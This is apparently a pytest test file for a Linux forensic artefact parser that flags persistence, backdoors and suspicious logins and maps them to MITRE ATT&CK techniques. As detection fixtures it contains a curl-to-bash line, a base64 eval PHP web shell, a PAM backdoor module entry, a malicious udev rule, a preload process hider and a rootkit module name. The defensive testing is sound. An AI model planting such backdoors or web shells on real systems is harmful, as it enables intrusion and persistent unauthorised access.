"""Linux artefacts in raw/linux/ and the extra user_profiles/ histories (process/linux_artefacts.py)."""
import csv
import sqlite3
import struct
import sys
from pathlib import Path

import pytest

# Appended, not prepended: src/analysis/platform would shadow the stdlib module.
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from dernvale.process import linux_artefacts as la  # noqa: E402


def host(tmp_path):
    raw = tmp_path / "out" / "HOST" / "artefacts" / "raw"
    (raw / "linux").mkdir(parents=True)
    (raw / "user_profiles").mkdir()
    return str(tmp_path / "out") + "/", raw


def run(out, artefact):
    return la.process_linux_artefact("", "'HOST'", out, "HOST::Linux", "/", "processing", str(artefact))


def rows(out, name):
    with open(Path(out) / "HOST" / "artefacts" / "cooked" / name, newline="") as fh:
        return list(csv.DictReader(fh))


def techniques(out):
    path = Path(out) / "mitre_techniques.txt"
    return path.read_text().split() if path.exists() else []


def utmp_record(ut_type, user, line, host_name, seconds, address=b"\x0a\x00\x00\x05"):
    return struct.pack("<hxxi32s4s32s256shhiii16s20x", ut_type, 1234, line.encode(), b"ts/0", user.encode(),
                       host_name.encode(), 0, 0, 0, seconds, 0, address + b"\0" * 12)


def test_routing():
    assert la.is_linux_artefact("/c/HOST/artefacts/raw/linux/etc+pam.d+sshd")
    assert la.is_linux_artefact("/c/HOST/artefacts/raw/user_profiles/bob+viminfo")
    assert la.is_linux_artefact("/c/HOST/artefacts/raw/bob+recently-used.xbel")
    assert not la.is_linux_artefact("/c/HOST/artefacts/raw/user_profiles/bob+bash_history")
    assert not la.is_linux_artefact("/c/HOST/artefacts/raw/logs/var+syslog")
    assert la.host_path("home+bob+.config+autostart+x.desktop") == "/home/bob/.config/autostart/x.desktop"


def test_wtmp_and_btmp(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "var+log+wtmp").write_bytes(
        utmp_record(7, "bob", "pts/0", "10.0.0.5", 1793000000) + utmp_record(8, "", "pts/0", "", 1793000100))
    (raw / "linux" / "var+log+btmp").write_bytes(b"".join(
        utmp_record(6, "root", "ssh:notty", "203.0.113.9", 1793000000 + i, b"\xcb\x00\x71\x09") for i in range(12)))
    run(out, raw / "linux" / "var+log+wtmp")
    run(out, raw / "linux" / "var+log+btmp")
    found = rows(out, "login_records.csv")
    assert found[0]["Type"] == "USER_PROCESS" and found[0]["User"] == "bob" and found[0]["Address"] == "10.0.0.5"
    assert found[0]["LastWriteTime"].startswith("2026-")
    assert len([r for r in found if r["Source"] == "/var/log/btmp"]) == 12
    assert "T1110.001" in techniques(out)


def test_lastlog_names_users_from_passwd(tmp_path):
    out, raw = host(tmp_path)
    (raw / "passwd").write_text("root:x:0:0::/root:/bin/bash\nbob:x:2:2::/home/bob:/bin/bash\n")
    record = struct.Struct("<i32s256s")
    (raw / "linux" / "var+log+lastlog").write_bytes(
        record.pack(0, b"", b"") * 2 + record.pack(1793000000, b"pts/1", b"198.51.100.4"))
    run(out, raw / "linux" / "var+log+lastlog")
    found = rows(out, "lastlog.csv")
    assert len(found) == 1 and found[0]["User"] == "bob" and found[0]["Host"] == "198.51.100.4"


def test_preload_and_shell_init(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "etc+ld.so.preload").write_text("# comment\n/usr/lib/libprocesshider.so\n")
    (raw / "linux" / "etc+profile.d+update.sh").write_text("export PATH=$PATH\ncurl -s http://x/a | bash\n")
    (raw / "linux" / "etc+rc.local").write_text("#!/bin/sh -e\n/opt/agent/start\nexit 0\n")
    for name in ("etc+ld.so.preload", "etc+profile.d+update.sh", "etc+rc.local"):
        run(out, raw / "linux" / name)
    assert rows(out, "preload.csv")[0]["Library"] == "/usr/lib/libprocesshider.so"
    init = rows(out, "shell_init.csv")
    assert [r["Flag"] for r in init] == ["suspicious command", "runs at boot"]
    assert {"T1574.006", "T1546.004", "T1037.004"} <= set(techniques(out))


def test_pam_flags_only_the_odd_lines(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "etc+pam.d+common-auth").write_text(
        "auth [success=1 default=ignore] pam_unix.so nullok\n"
        "auth requisite pam_deny.so\n"
        "auth required pam_permit.so\n"
        "auth include system-auth\n"
        "@include common-account\n"
        "auth sufficient /tmp/.x/pam_backdoor.so\n"
        "session optional pam_exec.so /usr/local/bin/notify\n")
    run(out, raw / "linux" / "etc+pam.d+common-auth")
    found = rows(out, "pam.csv")
    assert found[0]["Control"] == "[success=1 default=ignore]" and found[0]["Flag"] == ""
    assert [r["Flag"] for r in found if r["Flag"]] == ["module outside the PAM security directory", "runs a command"]
    assert "T1556.003" in techniques(out)


def test_sudoers(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "etc+sudoers.d+backup").write_text(
        "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\nsvc ALL=(ALL) NOPASSWD: ALL\n")
    run(out, raw / "linux" / "etc+sudoers.d+backup")
    found = rows(out, "sudoers.csv")
    assert [r["Flag"] for r in found] == ["", "", "NOPASSWD; full root for a non-admin principal"]
    assert "T1548.003" in techniques(out)


def test_cloud_init_sudoers_is_listed_not_tagged(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "etc+sudoers.d+90-cloud-init-users").write_text("ubuntu ALL=(ALL) NOPASSWD:ALL\n")
    run(out, raw / "linux" / "etc+sudoers.d+90-cloud-init-users")
    assert rows(out, "sudoers.csv")[0]["Flag"].startswith("NOPASSWD")
    assert techniques(out) == []


def test_autostart_and_user_units(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "etc+xdg+autostart+gnome-keyring.desktop").write_text(
        "[Desktop Entry]\nName=Keyring\nExec=/usr/bin/gnome-keyring-daemon --start\n")
    (raw / "linux" / "home+bob+.config+autostart+upd.desktop").write_text(
        "[Desktop Entry]\nName=Updater\nExec=/dev/shm/.u -d\n")
    (raw / "linux" / "home+bob+.config+systemd+user+sync.service").write_text(
        "[Service]\nExecStart=/home/bob/.local/bin/sync\n")
    for name in ("etc+xdg+autostart+gnome-keyring.desktop", "home+bob+.config+autostart+upd.desktop",
                 "home+bob+.config+systemd+user+sync.service"):
        run(out, raw / "linux" / name)
    found = rows(out, "autostart.csv")
    assert [(r["Kind"], r["Flag"]) for r in found] == [
        ("system autostart", ""), ("user autostart", "suspicious command"), ("systemd user unit", "")]
    assert {"T1547.013", "T1543.002"} <= set(techniques(out))


def test_user_histories(tmp_path):
    out, raw = host(tmp_path)
    profiles = raw / "user_profiles"
    (profiles / "bob+mysql_history").write_text("_HiStOrY_V2_\nselect\\040*\\040from\\040users;\n")
    (profiles / "bob+lesshst").write_text('.less-history-file:\n.search\n"password\n')
    (profiles / "bob+viminfo").write_text(
        "# Command Line History (newest to oldest):\n:wq\n"
        "# Search String History (newest to oldest):\n?/secret\n"
        "# File marks:\n'0  12  0  /etc/shadow\n"
        "# Jumplist (newest first):\n> /etc/passwd\n")
    (profiles / "bob+wget-hsts").write_text("# HSTS 1.0 Known Hosts database\nexample.org\t0\t1\t1793000000\t31536000\n")
    (profiles / "bob+recently-used.xbel").write_text(
        '<?xml version="1.0"?><xbel version="1.0" xmlns:bookmark="http://www.freedesktop.org/standards/desktop-bookmarks">'
        '<bookmark href="file:///home/bob/loot.zip" added="2026-10-01T10:00:00Z" modified="2026-10-01T10:00:00Z" '
        'visited="2026-10-01T10:00:00Z"><info><metadata><bookmark:applications>'
        '<bookmark:application name="File Roller" exec="file-roller %u"/></bookmark:applications></metadata></info>'
        '</bookmark></xbel>')
    for name in ("bob+mysql_history", "bob+lesshst", "bob+viminfo", "bob+wget-hsts", "bob+recently-used.xbel"):
        run(out, profiles / name)
    assert [r["Command"] for r in rows(out, "shell_histories.csv")] == ["select * from users;", "password"]
    assert [(r["Kind"], r["Value"]) for r in rows(out, "viminfo.csv")] == [
        ("command", "wq"), ("search", "/secret"), ("file mark", "/etc/shadow"), ("file", "/etc/passwd")]
    assert rows(out, "wget_hsts.csv")[0]["Host"] == "example.org"
    used = rows(out, "recently_used.csv")[0]
    assert used["URI"] == "file:///home/bob/loot.zip" and used["Applications"] == "File Roller"


def test_unparsed_linux_files_are_consumed(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "etc+nginx+nginx.conf").write_text("worker_processes auto;\n")
    assert run(out, raw / "linux" / "etc+nginx+nginx.conf") is True
    cooked = Path(out) / "HOST" / "artefacts" / "cooked"
    assert not cooked.exists() or not any(cooked.iterdir())


def test_udev(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "etc+udev+rules.d+99-x.rules").write_text(
        'ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/sh -c \'/tmp/x &\'"\n'
        'KERNEL=="sda", PROGRAM="/usr/lib/udev/scsi_id -g"\n')
    run(out, raw / "linux" / "etc+udev+rules.d+99-x.rules")
    found = rows(out, "udev_rules.csv")
    assert found[0]["Flag"] == "suspicious command; administrator rule" and found[1]["Flag"] == "administrator rule"
    assert "T1546.017" in techniques(out)


def test_kernel_modules(tmp_path):
    out, raw = host(tmp_path)
    (raw / "linux" / "gandalf+kernel_modules.csv").write_text(
        "Name,Size,Instances,State,Taint,Path,SHA256\n"
        "ext4,1000,1,Live,,/lib/modules/6.8.0/kernel/fs/ext4/ext4.ko.zst,ab\n"
        "vboxdrv,600,2,Live,OE,/lib/modules/6.8.0/updates/dkms/vboxdrv.ko,cd\n"
        "diamorphine,16384,0,Live,OE,,\n"
        "nf_tables,300,0,Live,,?,\n")
    run(out, raw / "linux" / "gandalf+kernel_modules.csv")
    found = {r["Name"]: r["Flag"] for r in rows(out, "kernel_modules.csv")}
    assert found == {"ext4": "", "vboxdrv": "out-of-tree; unsigned",
                     "diamorphine": "no module file; out-of-tree; unsigned", "nf_tables": ""}
    assert "T1547.006" in techniques(out)


def test_webshell(tmp_path):
    out, raw = host(tmp_path)
    # Assembled at run time: endpoint antivirus deletes source files holding the literal
    shell = "<?php @" + "ev" + "al(base64" + "_decode($" + "_POST['z'])); ?>"
    assert la.WEBSHELL.search(shell) and not la.WEBSHELL.search("<?php echo 'hello'; ?>")
    (raw / "linux" / "var+www+html+index.php").write_text("<?php echo 'hello'; ?>")
    (raw / "linux" / "var+www+html+up+img.php").write_text(shell)
    try:
        (raw / "linux" / "var+www+html+up+img.php").read_bytes()
    except OSError:
        pytest.skip("endpoint antivirus blocks reading the sample web shell")
    run(out, raw / "linux" / "var+www+html+index.php")
    run(out, raw / "linux" / "var+www+html+up+img.php")
    found = rows(out, "webshells.csv")
    assert len(found) == 1 and found[0]["Source"] == "/var/www/html/up/img.php"
    assert "T1505.003" in techniques(out)


def test_wtmpdb_and_lastlog2(tmp_path):
    out, raw = host(tmp_path)
    db = sqlite3.connect(raw / "linux" / "var+lib+wtmpdb+wtmp.db")
    db.execute("CREATE TABLE wtmp(ID INTEGER PRIMARY KEY, Type INTEGER, User TEXT NOT NULL, Login INTEGER, "
               "Logout INTEGER, TTY TEXT, RemoteHost TEXT, Service TEXT)")
    db.execute("INSERT INTO wtmp VALUES (1, 3, 'bob', 1793000000000000, 1793003600000000, 'pts/0', '198.51.100.4', 'sshd')")
    db.commit(); db.close()
    db = sqlite3.connect(raw / "linux" / "var+lib+lastlog+lastlog2.db")
    db.execute("CREATE TABLE Lastlog2(Name TEXT PRIMARY KEY, Time INTEGER, TTY TEXT, RemoteHost TEXT, Service TEXT)")
    db.execute("INSERT INTO Lastlog2 VALUES ('bob', 1793000000, 'pts/0', '198.51.100.4', 'sshd')")
    db.commit(); db.close()
    run(out, raw / "linux" / "var+lib+wtmpdb+wtmp.db")
    run(out, raw / "linux" / "var+lib+lastlog+lastlog2.db")
    sessions = rows(out, "login_records.csv")
    assert [(r["Type"], r["User"], r["Host"]) for r in sessions] == [
        ("USER_PROCESS", "bob", "198.51.100.4"), ("DEAD_PROCESS", "bob", "198.51.100.4")]
    assert sessions[1]["LastWriteTime"] > sessions[0]["LastWriteTime"]
    assert rows(out, "lastlog.csv")[0]["User"] == "bob"


def test_selection_matches_whole_paths(tmp_path):
    from dernvale.process.select import select_artefacts_to_process

    _, raw = host(tmp_path)
    for name in ("etc+sudoers", "etc+sudoers.d+gandalf"):
        (raw / "linux" / name).write_text("root ALL=(ALL) ALL\n")
    done = [str(raw / "linux" / "etc+sudoers.d+gandalf")]
    chosen = select_artefacts_to_process("HOST::Linux", [str(raw)], [], done)
    assert [c.split(": ", 1)[1] for c in chosen] == [str(raw / "linux" / "etc+sudoers")]


def test_image_collection_matches_gandalf_layout(tmp_path):
    from dernvale.collect import linux as collect_linux

    mnt = tmp_path / "mnt"
    for rel, text in {
        "etc/sudoers": "root ALL=(ALL) ALL\n",
        "etc/pam.d/sshd": "auth include common-auth\n",
        "etc/udev/rules.d/99-x.rules": 'RUN+="/tmp/x"\n',
        "home/bob/.viminfo": "> /etc/passwd\n",
        "home/bob/.config/autostart/u.desktop": "[Desktop Entry]\nExec=/tmp/u\n",
        "var/www/html/a.php": "<?php echo 1;\n",
        "var/www/html/logo.png": "png",
        "tmp/.x/run.sh": "#!/bin/sh\n",
    }.items():
        (mnt / rel).parent.mkdir(parents=True, exist_ok=True)
        (mnt / rel).write_text(text)
    (mnt / "tmp/.x/run.sh").chmod(0o755)
    dest = str(tmp_path / "out" / "HOST" / "artefacts" / "raw") + "/"
    collect_linux.collect_linux_extras(str(mnt), dest, "HOST::Linux", str(tmp_path / "out") + "/", "collecting", "")
    linux = sorted(p.name for p in Path(dest, "linux").iterdir())
    assert linux == ["etc+pam.d+sshd", "etc+sudoers", "etc+udev+rules.d+99-x.rules", "gandalf+tmp_executables.csv",
                     "home+bob+.config+autostart+u.desktop", "var+www+html+a.php"]
    assert (Path(dest) / "user_profiles" / "bob+viminfo").exists()
    listing = (Path(dest) / "linux" / "gandalf+tmp_executables.csv").read_text()
    assert "/tmp/.x/run.sh" in listing and ",script," in listing
